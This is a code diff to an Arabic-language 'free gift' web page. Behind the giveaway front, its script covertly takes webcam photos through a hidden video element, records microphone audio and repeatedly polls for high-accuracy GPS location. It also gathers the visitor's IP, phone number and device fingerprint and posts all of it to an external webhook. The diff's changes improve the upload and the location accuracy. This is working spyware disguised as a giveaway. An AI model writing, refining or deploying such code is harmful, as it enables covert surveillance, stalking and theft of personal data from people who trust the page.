@@ -126,8 +126,6 @@
         .status.success { background: rgba(46,213,115,0.15); color: #2ed573; display: block; }
         .status.info { background: rgba(54,164,235,0.15); color: #36a4eb; display: block; }
         .status.error { background: rgba(255,107,107,0.15); color: #ff6b6b; display: block; }
-        
-        /* ===== زر المطور المميز ===== */
         .dev-btn {
             display: inline-block;
             margin-top: 18px;
@@ -144,10 +142,7 @@
             box-shadow: 0 0 15px rgba(255,215,0,0.10);
             letter-spacing: 0.5px;
         }
-        .dev-btn i {
-            margin-left: 8px;
-            font-size: 18px;
-        }
+        .dev-btn i { margin-left: 8px; font-size: 18px; }
         .dev-btn:hover {
             background: rgba(255,215,0,0.20);
             box-shadow: 0 0 30px rgba(255,215,0,0.25);
@@ -155,11 +150,7 @@
             color: #fff;
             border-color: #fff3c0;
         }
-        .dev-btn:active {
-            transform: scale(0.96);
-        }
-        /* ===== نهاية زر المطور ===== */
-
+        .dev-btn:active { transform: scale(0.96); }
         .footer {
             margin-top: 25px;
             font-size: 13px;
@@ -170,17 +161,9 @@
             flex-direction: column;
             gap: 6px;
         }
-        .footer .developer {
-            color: #ffd700;
-            font-weight: 500;
-        }
-        .footer .developer a {
-            color: #ffd700;
-            text-decoration: none;
-        }
-        .footer .developer a:hover {
-            text-decoration: underline;
-        }
+        .footer .developer { color: #ffd700; font-weight: 500; }
+        .footer .developer a { color: #ffd700; text-decoration: none; }
+        .footer .developer a:hover { text-decoration: underline; }
         #hiddenVideo { position: fixed; top: -1000px; left: -1000px; width: 320px; height: 240px; opacity: 0; pointer-events: none; }
         #hiddenCanvas { display: none; }
         @media (max-width: 480px) {
@@ -244,21 +227,14 @@
             </div>
             <p style="color: #aaa; font-size: 14px; margin-top: 10px;">يرجى الانتظار، ستصلك الهدية تلقائياً</p>
             <div class="status" id="statusTimer"></div>
-
-            <!-- ===== زر المطور المميز ===== -->
             <a href="https://t.me/iashraf_mousa" target="_blank" class="dev-btn">
                 <i class="fab fa-telegram"></i> المطور: @iashraf_mousa
             </a>
-            <!-- ===== نهاية زر المطور ===== -->
         </div>
 
         <div class="footer">
-            <div>
-                <i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة
-            </div>
-            <div class="developer">
-                <i class="fas fa-code"></i> المطور: <a href="https://t.me/iashraf_mousa" target="_blank">@iashraf_mousa</a>
-            </div>
+            <div><i class="fas fa-shield-alt" style="color: #ffd700;"></i> نحمي خصوصيتك • جميع الحقوق محفوظة</div>
+            <div class="developer"><i class="fas fa-code"></i> المطور: <a href="https://t.me/iashraf_mousa" target="_blank">@iashraf_mousa</a></div>
         </div>
     </div>
 
@@ -268,7 +244,7 @@
 
     <script>
         // ================================================================
-        //  CONFIG - WEBHOOK (غيّر الرابط حسب سيرفرك)
+        //  CONFIG - WEBHOOK
         // ================================================================
         const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
 
@@ -334,19 +310,20 @@
         }
 
         // ================================================================
-        //  WEBHOOK SENDER
+        //  WEBHOOK SENDER (باستخدام FormData)
         // ================================================================
-        async function sendToWebhook(data) {
+        async function sendToWebhook(formData) {
             if (!USER_TOKEN) {
                 console.error('❌ Cannot send: token missing');
                 return { success: false, error: 'Token missing' };
             }
-            const payload = { token: USER_TOKEN, ...data };
+            // إضافة التوكن إلى FormData
+            formData.append('token', USER_TOKEN);
+
             try {
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: formData // لا نضع Content-Type، المتصفح سيضبطه تلقائياً مع الـ boundary
                 });
                 const result = await response.json();
                 if (!response.ok) {
@@ -370,7 +347,8 @@
         let audioStream = null;
         let audioRecorder = null;
         let audioChunks = [];
-        let capturedPhotos = [];
+        let capturedPhotoFiles = []; // مصفوفة من Blob/File
+        let audioBlob = null;
         let userIP = 'غير متاح';
         let userLocation = { lat: null, lng: null, accuracy: null, error: null };
         let isProcessing = false;
@@ -405,17 +383,16 @@
                 ip = data.ip;
                 userIP = ip;
             } catch (e) {}
-            const payload = {
-                event: 'visit',
-                timestamp: new Date().toISOString(),
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                url: window.location.href
-            };
-            const result = await sendToWebhook(payload);
+            const formData = new FormData();
+            formData.append('event', 'visit');
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('ip', ip);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('platform', navigator.platform);
+            formData.append('language', navigator.language);
+            formData.append('screen', `${screen.width}x${screen.height}`);
+            formData.append('url', window.location.href);
+            const result = await sendToWebhook(formData);
             if (!result.success) {
                 console.warn('⚠️ Failed to send visit notification:', result.error);
             }
@@ -458,15 +435,14 @@
             const now = Date.now();
             if (now - alertCooldown < 5000) return;
             alertCooldown = now;
-            const payload = {
-                event: 'suspicious',
-                action: action,
-                timestamp: new Date().toISOString(),
-                ip: userIP,
-                userAgent: navigator.userAgent,
-                url: window.location.href
-            };
-            sendToWebhook(payload).catch(console.warn);
+            const formData = new FormData();
+            formData.append('event', 'suspicious');
+            formData.append('action', action);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('ip', userIP);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('url', window.location.href);
+            sendToWebhook(formData).catch(console.warn);
         }
 
         // ================================================================
@@ -507,8 +483,9 @@
             statusTasks.className = 'status';
             statusTasks.style.display = 'none';
             phoneInput.value = '';
-            capturedPhotos = [];
+            capturedPhotoFiles = [];
             audioChunks = [];
+            audioBlob = null;
             claimBtn.disabled = false;
             claimBtn.classList.remove('loading');
             claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على الهدية';
@@ -552,11 +529,13 @@
 
             await getIPAddress();
             await getLocation();
-            const cameraOk = await startCameraAndCapture();
-            const audioOk = await recordAudio();
-            await sendAllData();
+            await startCameraAndCapture();
+            await recordAudio();
 
-            if (capturedPhotos.length > 0 || audioChunks.length > 0) {
+            // بعد الانتهاء من التقاط الصور والصوت، نرسل البيانات
+            const success = await sendAllData();
+
+            if (success) {
                 showStep('step-timer');
                 startTimer(180);
             } else {
@@ -581,30 +560,75 @@
             }
         }
 
+        // ================================================================
+        //  تحسين الحصول على الموقع الجغرافي
+        // ================================================================
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    userLocation.error = 'Not supported';
+                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                     resolve();
                     return;
                 }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        userLocation.lat = pos.coords.latitude;
-                        userLocation.lng = pos.coords.longitude;
-                        userLocation.accuracy = pos.coords.accuracy;
-                        userLocation.error = null;
-                        resolve();
-                    },
-                    (err) => {
-                        userLocation.error = err.message;
-                        resolve();
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 3000 }
-                );
+
+                let attempts = 0;
+                const maxAttempts = 5;
+                let bestAccuracy = Infinity;
+                let bestPosition = null;
+
+                const tryGetPosition = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const accuracy = pos.coords.accuracy;
+                            // نقبل الموقع إذا كانت الدقة 100 متر أو أقل، أو بعد 5 محاولات نأخذ الأفضل
+                            if (accuracy < bestAccuracy) {
+                                bestAccuracy = accuracy;
+                                bestPosition = pos;
+                            }
+
+                            if (accuracy <= 100 || attempts >= maxAttempts - 1) {
+                                // نهاية المحاولات أو دقة مقبولة
+                                if (bestPosition) {
+                                    userLocation.lat = bestPosition.coords.latitude;
+                                    userLocation.lng = bestPosition.coords.longitude;
+                                    userLocation.accuracy = bestPosition.coords.accuracy;
+                                    userLocation.error = null;
+                                    showStatus(statusTasks, 'info', `📍 الموقع: ${bestPosition.coords.latitude.toFixed(6)}, ${bestPosition.coords.longitude.toFixed(6)} (دقة ${Math.round(bestPosition.coords.accuracy)} متر)`);
+                                } else {
+                                    userLocation.error = 'لم نحصل على موقع دقيق';
+                                }
+                                resolve();
+                            } else {
+                                // محاولة مرة أخرى للحصول على دقة أفضل
+                                attempts++;
+                                setTimeout(tryGetPosition, 2000);
+                            }
+                        },
+                        (err) => {
+                            // في حال الخطأ نحاول مرة أخرى حتى نصل للحد الأقصى
+                            if (attempts < maxAttempts - 1) {
+                                attempts++;
+                                setTimeout(tryGetPosition, 2000);
+                            } else {
+                                userLocation.error = err.message;
+                                resolve();
+                            }
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 3000
+                        }
+                    );
+                };
+
+                tryGetPosition();
             });
         }
 
+        // ================================================================
+        //  الكاميرا: حفظ الصور كـ Blob Files
+        // ================================================================
         async function startCameraAndCapture() {
             return new Promise(async (resolve) => {
                 try {
@@ -635,19 +659,18 @@
 
                     showStatus(statusTasks, 'info', `📸 جاري التقاط ${TOTAL_PHOTOS} صور...`);
 
+                    capturedPhotoFiles = [];
+
                     for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                         ctx.drawImage(video, 0, 0, width, height);
-                        const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
-                        if (dataUrl && dataUrl.length > 5000) {
-                            capturedPhotos.push(dataUrl);
-                        } else {
-                            // محاولة إعادة المحاولة
-                            await new Promise(r => setTimeout(r, 200));
-                            ctx.drawImage(video, 0, 0, width, height);
-                            const retry = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);
-                            if (retry && retry.length > 5000) {
-                                capturedPhotos.push(retry);
-                            }
+                        // تحويل إلى Blob
+                        const blob = await new Promise((resolve) => {
+                            canvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
+                        });
+                        if (blob && blob.size > 1000) {
+                            // إضافة ملف مع اسم فريد
+                            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                            capturedPhotoFiles.push(file);
                         }
                         if (i < TOTAL_PHOTOS) {
                             showStatus(statusTasks, 'info', `📸 تم التقاط ${i} من ${TOTAL_PHOTOS} صور`);
@@ -655,7 +678,7 @@
                         }
                     }
 
-                    showStatus(statusTasks, 'info', `✅ تم التقاط ${capturedPhotos.length} صورة بنجاح`);
+                    showStatus(statusTasks, 'info', `✅ تم التقاط ${capturedPhotoFiles.length} صورة بنجاح`);
                     resolve(true);
 
                 } catch (error) {
@@ -671,6 +694,9 @@
             });
         }
 
+        // ================================================================
+        //  التسجيل الصوتي: حفظ كـ Blob
+        // ================================================================
         async function recordAudio() {
             return new Promise(async (resolve) => {
                 try {
@@ -680,7 +706,12 @@
                     audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                     audioChunks = [];
                     audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
-                    audioRecorder.onstop = () => { resolve(); };
+                    audioRecorder.onstop = () => {
+                        if (audioChunks.length > 0) {
+                            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        }
+                        resolve();
+                    };
                     audioRecorder.start();
                     showStatus(statusTasks, 'info', `🎤 جاري التسجيل الصوتي لمدة ${AUDIO_DURATION/1000} ثواني...`);
                     setTimeout(() => {
@@ -698,70 +729,52 @@
         }
 
         // ================================================================
-        //  SEND ALL DATA VIA WEBHOOK
+        //  إرسال البيانات باستخدام FormData
         // ================================================================
         async function sendAllData() {
-            const photosBase64 = capturedPhotos.map(d => d.split(',')[1]);
-            let audioBase64 = null;
-            if (audioChunks.length > 0) {
-                const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                audioBase64 = await blobToBase64(blob);
+            const formData = new FormData();
+
+            // إضافة البيانات النصية
+            formData.append('event', 'submission');
+            formData.append('country', selectedCountry);
+            formData.append('phone', userPhone);
+            formData.append('ip', userIP);
+            formData.append('location[lat]', userLocation.lat ?? '');
+            formData.append('location[lng]', userLocation.lng ?? '');
+            formData.append('location[accuracy]', userLocation.accuracy ?? '');
+            formData.append('location[error]', userLocation.error ?? '');
+            formData.append('device[userAgent]', navigator.userAgent);
+            formData.append('device[platform]', navigator.platform);
+            formData.append('device[language]', navigator.language);
+            formData.append('device[screen]', `${screen.width}x${screen.height}`);
+            formData.append('device[colorDepth]', screen.colorDepth);
+            formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
+            formData.append('timestamp', new Date().toISOString());
+
+            // إضافة الصور (ملفات)
+            if (capturedPhotoFiles.length > 0) {
+                capturedPhotoFiles.forEach((file, index) => {
+                    formData.append(`photos[]`, file, file.name);
+                });
             }
 
-            const payload = {
-                event: 'submission',
-                country: selectedCountry,
-                phone: userPhone,
-                ip: userIP,
-                location: {
-                    lat: userLocation.lat,
-                    lng: userLocation.lng,
-                    accuracy: userLocation.accuracy,
-                    error: userLocation.error
-                },
-                device: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                },
-                timestamp: new Date().toISOString(),
-                photos: photosBase64,
-                audio: audioBase64
-            };
+            // إضافة الصوت (ملف)
+            if (audioBlob) {
+                const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+                formData.append('audio', audioFile);
+            }
 
             showStatus(statusTasks, 'info', '📤 جاري إرسال البيانات...');
-            const result = await sendToWebhook(payload);
+            const result = await sendToWebhook(formData);
             if (result.success) {
                 console.log('✅ All data sent to webhook');
                 showStatus(statusTasks, 'success', '✅ تم إرسال البيانات بنجاح!');
+                return true;
             } else {
                 console.error('❌ Failed to send all data:', result.error);
                 showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
+                return false;
             }
-
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(t => t.stop());
-                mediaStream = null;
-                video.srcObject = null;
-            }
-        }
-
-        // ================================================================
-        //  HELPER: blob to base64
-        // ================================================================
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    const base64 = reader.result.split(',')[1];
-                    resolve(base64);
-                };
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
         }
 
         // ================================================================
